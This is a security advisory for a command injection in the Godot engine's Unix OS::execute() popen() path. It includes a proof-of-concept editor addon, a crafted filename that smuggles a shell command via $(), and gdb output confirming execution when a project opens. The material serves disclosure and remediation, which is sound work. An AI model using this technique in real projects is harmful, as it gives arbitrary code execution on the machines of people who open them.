# Godot OS Command Injection in OS::execute() via popen() (Unix)


**Tested Versions:** 4.7 stable (affects all 4.x on Linux/macOS/BSD)
---





https://github.com/user-attachments/assets/c5f3933c-5e95-4e10-9aee-139f651cfb34






## Affected Files
- `drivers/unix/os_unix.cpp:887-921` — `popen()` command string construction
- `drivers/unix/os_unix.cpp:923-951` — safe `fork()`+`execvp()` reference (not affected)
- `core/string/ustring.cpp:4490-4496` — `c_escape_multiline()` only escapes `\` and `"`
---
## Root Cause
`OS::execute()` on Unix uses `popen()` when output capture is requested. Arguments are wrapped in double quotes but shell metacharacters (`$`, backticks, `!`) are not escaped. `/bin/sh` interprets `$()` and backticks inside double-quoted strings, allowing arbitrary command execution from any addon that passes attacker-controlled filenames to this API.
---
## PoC
The addon `addons/img_opt/plugin.gd` registers a custom PNG importer whose
`_import()` forwards the imported filename, unmodified, to `OS.execute()` with
output capture:
```gdscript
@tool
extends EditorPlugin

class SimpleImporter:
    extends EditorImportPlugin
    func _get_recognized_extensions(): return ["png"]
    func _get_save_extension(): return "res"
    func _get_resource_type(): return "Texture2D"
    func _get_preset_count(): return 1
    func _get_preset_name(i): return "Default"
    func _get_priority(): return 10.0
    func _get_import_order(): return 0
    func _get_import_options(path, i): return []
    func _get_option_visibility(path, opt, opts): return true
    func _import(src, save, opts, pv, gf):
        var out = []
        OS.execute("echo", [src], out)   # out forces the popen() path
        return OK

func _enter_tree():
    add_import_plugin(SimpleImporter.new())
```
The non-null `out` array makes `r_pipe` non-null inside `OS_Unix::execute()`,
selecting the vulnerable `popen()` branch. Without it the safe `fork()`+`execvp()`
branch runs and nothing executes.

1. Place a file named `$(gnome-calculator &).png` in the project root.
2. Enable the addon in `project.godot` and open the project in Godot Editor.
3. Godot's import system routes the PNG to the addon via
   `EditorImportPlugin::import`, which calls
   `OS.execute("echo", ["res://$(gnome-calculator &).png"], out)`.
4. `popen()` builds `"/echo" "res://$(gnome-calculator &).png" 2>/dev/null`
   — the unescaped `$()` in the double-quoted arg is evaluated by the shell.

**Confirmed via gdb** — breakpoint at `drivers/unix/os_unix.cpp:898`:
```
pwndbg> p command
$2 = { _cowdata = { ..., _ptr = 0x5555796a8300
      U"\"echo\" \"res://$(gnome-calculator &).png\" 2>/dev/null" } }

pwndbg> bt
OS_Unix::execute (os_unix.cpp:898)            <- popen() on crafted string
  CoreBind::OS::execute (core_bind.cpp)
  GDScriptFunction::call
  GDScriptInstance::callp
  EditorImportPlugin::import                  <- Godot import system invoking addon
```

https://github.com/user-attachments/assets/e0d772b6-9572-4f30-807c-2f33b70c4a3d




Result: arbitrary command execution upon launch of .godot project
---
## Impact
Remote code execution on Linux, macOS, and BSD. The victim opens a malicious Godot project in the editor and arbitrary commands run under the user's shell. No external tools, configuration changes, or user interaction beyond opening the project is required. Any addon that calls `OS.execute()` with a filename and captures output is vulnerable. Shared projects (git, zip, Asset Library) propagate the payload to all team members. Impact persists until the malicious file is removed from the project.
---


## Suggested Remediation
Replace the `popen()` branch at `drivers/unix/os_unix.cpp:887-921` with `fork()` + `execvp()` + `pipe()` + `waitpid()`, matching the existing safe path at line 923. Alternatively, add `$` and backtick escaping to `c_escape_multiline()` at `core/string/ustring.cpp:4490`.


## Disclosure
An initial email was sent to godot security team on May 22, 2026, 5:04 PM ( 115days) , then further communication attempts from vulncheck Team since then, no response from them.






